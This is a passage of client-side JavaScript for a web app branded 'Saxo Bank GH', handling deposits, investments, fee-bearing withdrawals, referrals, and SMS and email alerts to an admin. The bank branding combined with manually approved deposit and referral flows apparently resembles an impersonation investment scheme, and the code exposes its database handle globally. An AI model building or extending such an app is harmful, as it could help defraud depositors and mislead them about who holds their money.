  let p=s.adminPhone.replace(/\D/g,'');if(p.startsWith('0'))p='233'+p.slice(1);
  fetch('https://sms.arkesel.com/sms/api?action=send-sms&api_key='+encodeURIComponent(s.arkeselKey)+'&to='+p+'&from='+encodeURIComponent(s.arkeselSender||'SaxoBank')+'&sms='+encodeURIComponent(msg)).catch(e=>console.warn('SMS:',e));
}
window.smsAdmin=smsAdmin;
function sendEmail(to,subject,message){
  const s=_settings;if(!s.ejsService||!s.ejsTemplate||!s.ejsKey||!to)return;
  try{emailjs.init(s.ejsKey);emailjs.send(s.ejsService,s.ejsTemplate,{to_email:to,subject,message,from_name:'Saxo Bank GH'});}catch(e){}
}
function emailAdmin(type,u,ref,amt){
  const s=_settings;if(!s.adminEmail)return;
  const msgs={
    new_user:{s:'🆕 New Account — '+u.name,m:'Name: '+u.name+'\nPhone: '+u.phone},
    deposit:{s:'💰 Deposit — '+u.name+' GHS '+f2(amt),m:u.name+' ('+u.phone+')\nAmount: GHS '+f2(amt)+'\nRef: '+ref+'\nApprove in Admin Panel.'},
    invest:{s:'📈 Investment — '+u.name+' GHS '+f2(amt),m:u.name+' invested GHS '+f2(amt)},
    withdraw:{s:'🏧 Withdrawal — '+u.name+' GHS '+f2(amt),m:u.name+' ('+u.phone+')\nAmount: GHS '+f2(amt)+'\nReceives: GHS '+f2(amt-amt*WDR_FEE)+'\nApprove in Admin Panel.'},
  };
  const m=msgs[type];if(m)sendEmail(s.adminEmail,m.s,m.m);
}
window.emailAdmin=emailAdmin;
window.getSettings=()=>_settings;
window.getDB=()=>db;
window.getCurrentUser=()=>_user;

/* ===== EXPOSE ===== */
window.switchAuthTab=switchAuthTab;window.register=register;window.login=login;window.quickLogin=quickLogin;
window.showAddAccount=showAddAccount;window.switchAccount=switchAccount;
window.logout=logout;window.showPage=showPage;window.goBack=goBack;
window.livePhone=livePhone;window.closeModal=closeModal;
window.renderDeposit=renderDeposit;window.initiateDeposit=initiateDeposit;window.submitDeposit=submitDeposit;
window.showConfirm=showConfirm;window.confirmInvest=confirmInvest;
window.renderWithdraw=renderWithdraw;window.calcFee=calcFee;window.requestWithdrawal=requestWithdrawal;
window.renderReferral=renderReferral;window.copyText=copyText;window.filterTx=filterTx;

document.addEventListener('DOMContentLoaded',()=>{
  history.replaceState({page:'dashboard'},'dashboard');
  const r=new URLSearchParams(location.search).get('ref');
  if(r){const el=document.getElementById('regRef');if(el){el.value=r;switchAuthTab('register');}}
  boot();
});
